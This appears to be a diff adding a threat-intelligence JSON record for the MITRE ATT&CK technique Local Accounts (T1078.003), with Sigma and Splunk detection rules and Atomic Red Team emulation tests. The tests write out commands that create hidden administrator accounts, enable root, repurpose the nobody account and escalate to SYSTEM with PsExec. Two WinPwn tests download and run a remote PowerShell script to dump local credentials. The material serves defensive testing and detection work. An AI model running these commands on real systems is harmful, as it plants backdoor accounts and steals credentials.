@@ -1,0 +1,309 @@
+{
+    "id": "T1078.003",
+    "name": "Local Accounts",
+    "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
+    "platforms": "Linux, macOS, Windows, Containers",
+    "kill_chain_phases": "Defense Evasion, Persistence, Privilege Escalation, Initial Access",
+    "data_sources": "Logon Session: Logon Session Metadata, User Account: User Account Authentication, Logon Session: Logon Session Creation",
+    "detection": "Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.",
+    "url": "https://attack.mitre.org/techniques/T1078/003",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1078.003",
+                "atomic_attack_guid": "6904235f-0f55-4039-8aed-41c300ff7733",
+                "atomic_attack_name": "Use PsExec to elevate to NT Authority\\SYSTEM account",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Psexec Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_execution.yml",
+                        "remote_content": "title: Psexec Execution\nid: 730fc21b-eaff-474b-ad23-90fd265d4988\nstatus: test\ndescription: Detects user accept agreement execution in psexec commandline\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: omkar72\ndate: 2020-10-30\nmodified: 2023-02-28\ntags:\n    - attack.execution\n    - attack.t1569\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\psexec.exe'\n        - OriginalFileName: 'psexec.c'\n    condition: selection\nfalsepositives:\n    - Administrative scripts.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Potential Execution of Sysinternals Tools",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
+                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Detect PsExec With accepteula Flag",
+                        "rule_link": "https://research.splunk.com/endpoint/27c3a83d-cada-47c6-9042-67baf19d2574/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1078.003",
+                "atomic_attack_guid": "a524ce99-86de-4db6-b4f9-e08f35a47a15",
+                "atomic_attack_name": "Create local account with admin privileges",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "User Added to Local Administrators Group",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_add_user_local_admin_group.yml",
+                        "remote_content": "title: User Added to Local Administrators Group\nid: ad720b90-25ad-43ff-9b5e-5c841facc8e5\nrelated:\n    - id: ffa28e60-bdb1-46e0-9f82-05f7a61cc06e # Remote Desktop groups\n      type: similar\n    - id: 10fb649c-3600-4d37-b1e6-56ea90bb7e09 # Privileged groups\n      type: similar\nstatus: test\ndescription: Detects addition of users to the local administrator group via \"Net\" or \"Add-LocalGroupMember\".\nreferences:\n    - https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-12\nmodified: 2023-03-02\ntags:\n    - attack.persistence\n    - attack.t1098\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_main:\n        - CommandLine|contains|all:\n              # net.exe\n              - 'localgroup '\n              - ' /add'\n        - CommandLine|contains|all:\n              # powershell.exe\n              - 'Add-LocalGroupMember '\n              - ' -Group '\n    selection_group:\n        CommandLine|contains:\n            - ' administrators '\n            - ' administrateur' # Typo without an 'S' so we catch both\n    condition: all of selection_*\nfalsepositives:\n    - Administrative activity\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "fdc47f44-dd32-4b99-af5f-209f556f63c2",
+                    "0f63e1ef-1eb9-4226-9d54-8927ca08520a",
+                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                    "cdc842aa-761d-48e2-9b97-c344bed8b3a8"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "fdc47f44-dd32-4b99-af5f-209f556f63c2",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1078.003",
+                            "mitre-cti:description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
+                            "mitre-cti:name": "Local Accounts",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows', 'Containers'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2', 'type': 'attack-pattern', 'created': '2020-03-13T20:26:46.695Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1078.003', 'url': 'https://attack.mitre.org/techniques/T1078/003'}], 'modified': '2021-10-18T17:45:48.323Z', 'name': 'Local Accounts', 'description': 'Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\\n\\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'initial-access'}], 'x_mitre_detection': 'Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.2', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['User Account: User Account Authentication', 'Logon Session: Logon Session Metadata', 'Logon Session: Logon Session Creation'], 'x_mitre_permissions_required': ['Administrator', 'User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0f63e1ef-1eb9-4226-9d54-8927ca08520a",
+                        "lookup_data": {
+                            "description": "Detect remote login by Administrator user (depending on internal pattern).",
+                            "raw": "author: juju4\ndate: 2017/10/29\ndescription: Detect remote login by Administrator user (depending on internal pattern).\ndetection:\n  condition: selection\n  selection:\n    AuthenticationPackageName: Negotiate\n    EventID: 4624\n    LogonType: 10\n    TargetUserName|startswith: Admin\nfalsepositives:\n- Legitimate administrative activity.\nid: 0f63e1ef-1eb9-4226-9d54-8927ca08520a\nlevel: low\nlogsource:\n  definition: 'Requirements: Identifiable administrators usernames (pattern or special\n    unique character. ex: \"Admin-*\"), internal policy mandating use only as secondary\n    account'\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://car.mitre.org/wiki/CAR-2016-04-005\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.t1078.001\n- attack.t1078.002\n- attack.t1078.003\n- car.2016-04-005\ntitle: Admin User Remote Logon\n",
+                            "sigma:id": "0f63e1ef-1eb9-4226-9d54-8927ca08520a",
+                            "title": "Admin User Remote Logon",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                        "lookup_data": {
+                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1666603345",
+                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
+                        "lookup_data": {
+                            "description": "Cyberattack on fuel supplier causes supply chain disruption",
+                            "link": "http://www.botvrij.eu/data/feed-osint/cdc842aa-761d-48e2-9b97-c344bed8b3a8.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1644231782",
+                            "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1078.003",
+                "display_name": "Valid Accounts: Local Accounts",
+                "atomic_tests": [
+                    {
+                        "name": "Create local account with admin privileges",
+                        "auto_generated_guid": "a524ce99-86de-4db6-b4f9-e08f35a47a15",
+                        "description": "After execution the new account will be active and added to the Administrators group",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "password": {
+                                "description": "Password for art-test user",
+                                "type": "string",
+                                "default": "-4RTisCool!-321"
+                            }
+                        },
+                        "executor": {
+                            "command": "net user art-test /add\nnet user art-test #{password}\nnet localgroup administrators art-test /add",
+                            "cleanup_command": "net localgroup administrators art-test /delete >nul 2>&1\nnet user art-test /delete >nul 2>&1",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create local account with admin privileges - MacOS",
+                        "auto_generated_guid": "f1275566-1c26-4b66-83e3-7f9f7f964daa",
+                        "description": "After execution the new account will be active and added to the Administrators group",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "executor": {
+                            "command": "dscl . -create /Users/AtomicUser\ndscl . -create /Users/AtomicUser UserShell /bin/bash\ndscl . -create /Users/AtomicUser RealName \"Atomic User\"\ndscl . -create /Users/AtomicUser UniqueID 503\ndscl . -create /Users/AtomicUser PrimaryGroupID 503\ndscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser\ndscl . -passwd /Users/AtomicUser mySecretPassword\ndscl . -append /Groups/admin GroupMembership AtomicUser",
+                            "cleanup_command": "sudo dscl . -delete /Users/AtomicUser",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create local account with admin privileges using sysadminctl utility - MacOS",
+                        "auto_generated_guid": "191db57d-091a-47d5-99f3-97fde53de505",
+                        "description": "After execution the new account will be active and added to the Administrators group",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "executor": {
+                            "command": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin",
+                            "cleanup_command": "sysadminctl interactive -deleteUser art-tester",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Enable root account using dsenableroot utility - MacOS",
+                        "auto_generated_guid": "20b40ea9-0e17-4155-b8e6-244911a678ac",
+                        "description": "After execution the current/new user will have root access",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "executor": {
+                            "command": "dsenableroot #current user\ndsenableroot -u art-tester -p art-tester -r art-root #new user",
+                            "cleanup_command": "dsenableroot -d #current user\ndsenableroot -d -u art-tester -p art-tester #new user",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Add a new/existing user to the admin group using dseditgroup utility - macOS",
+                        "auto_generated_guid": "433842ba-e796-4fd5-a14f-95d3a1970875",
+                        "description": "After execution the current/new user will be added to the Admin group",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "executor": {
+                            "command": "dseditgroup -o edit -a art-user -t user admin",
+                            "cleanup_command": "dseditgroup -o edit -d art-user -t user admin",
+                            "name": "bash",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Loot local Credentials - powerhell kittie",
+                        "auto_generated_guid": "9e9fd066-453d-442f-88c1-ad7911d32912",
+                        "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nobfuskittiedump -consoleoutput -noninteractive",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "WinPwn - Loot local Credentials - Safetykatz",
+                        "auto_generated_guid": "e9fdb899-a980-4ba4-934b-486ad22e22f4",
+                        "description": "Loot local Credentials - Safetykatz technique via function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsafedump -consoleoutput -noninteractive",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create local account (Linux)",
+                        "auto_generated_guid": "02a91c34-8a5b-4bed-87af-501103eb5357",
+                        "description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "executor": {
+                            "name": "bash",
+                            "elevation_required": true,
+                            "command": "password=$(openssl passwd -1 art)\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\nsu art -c \"whoami; exit\"\n",
+                            "cleanup_command": "[ \"$(uname)\" = 'Linux' ] && userdel art -rf || rmuser -y art\n"
+                        }
+                    },
+                    {
+                        "name": "Reactivate a locked/expired account (Linux)",
+                        "auto_generated_guid": "d2b95631-62d7-45a3-aaef-0972cea97931",
+                        "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "executor": {
+                            "name": "bash",
+                            "elevation_required": true,
+                            "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art\nusermod --lock art\nusermod --expiredate \"1\" art\nusermod --unlock art\nusermod --expiredate \"99999\" art\nsu -c whoami art\n",
+                            "cleanup_command": "userdel -r art \n"
+                        }
+                    },
+                    {
+                        "name": "Reactivate a locked/expired account (FreeBSD)",
+                        "auto_generated_guid": "09e3380a-fae5-4255-8b19-9950be0252cf",
+                        "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "executor": {
+                            "name": "sh",
+                            "elevation_required": true,
+                            "command": "pw useradd art -g wheel -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user testuser1 -h 0\npw lock art\npw usermod art -e +1d\npw unlock art\npw user mod art -e +99d\nsu art\nwhoami\nexit\n",
+                            "cleanup_command": "rmuser -y art \n"
+                        }
+                    },
+                    {
+                        "name": "Login as nobody (Linux)",
+                        "auto_generated_guid": "3d2cd093-ee05-41bd-a802-59ee5c301b85",
+                        "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "executor": {
+                            "name": "bash",
+                            "elevation_required": true,
+                            "command": "cat /etc/passwd |grep nobody\nchsh --shell /bin/bash nobody\nusermod --password $(openssl passwd -1 nobody) nobody\nsu -c \"whoami\" nobody\n",
+                            "cleanup_command": "chsh --shell /usr/sbin/nologin nobody\ncat /etc/passwd |grep nobody\n# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
+                        }
+                    },
+                    {
+                        "name": "Login as nobody (freebsd)",
+                        "auto_generated_guid": "16f6374f-7600-459a-9b16-6a88fd96d310",
+                        "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin. Here is how the nobody entry should look like in `/etc/passwd` before the test is executed and right after the cleanup: `# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin`\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "executor": {
+                            "name": "sh",
+                            "elevation_required": true,
+                            "command": "cat /etc/passwd |grep nobody\npw usermod nobody -s /bin/sh\necho $(openssl passwd -1 art) | pw mod user nobody -h 0\nsu nobody\nwhoami\nexit\n",
+                            "cleanup_command": "pw usermod nobody -s /usr/sbin/nologin\ncat /etc/passwd |grep nobody\n# -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin\n"
+                        }
+                    },
+                    {
+                        "name": "Use PsExec to elevate to NT Authority\\SYSTEM account",
+                        "auto_generated_guid": "6904235f-0f55-4039-8aed-41c300ff7733",
+                        "description": "PsExec is a powerful tool most known for its remote management capability. However, it can also be used to run processes as the local system account.\n\nThe local system account is a default windows account which has unrestricted access to all system resources.\n\nUpon successful execution, PsExec.exe will spawn a command prompt which will run 'whoami' as the local system account and then exit.    \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0 } else { exit 1 }\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -accepteula -s %COMSPEC% /c whoami\n"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 12:32:59"
+}
